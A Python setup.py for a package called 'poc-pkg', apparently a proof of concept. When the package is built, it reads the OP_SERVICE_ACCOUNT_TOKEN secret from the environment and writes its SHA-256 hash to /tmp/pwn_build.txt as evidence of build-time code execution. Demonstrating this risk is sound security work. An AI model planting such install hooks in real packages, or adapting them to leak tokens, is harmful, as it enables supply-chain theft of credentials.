from setuptools import setup
import hashlib, os

_t = os.environ.get("OP_SERVICE_ACCOUNT_TOKEN", "")
with open("/tmp/pwn_build.txt", "w") as fh:
    fh.write("BUILD_TIME_EXEC=" + hashlib.sha256(_t.encode()).hexdigest() + "\n")

setup(name="poc-pkg", version="0.0.1", packages=[])
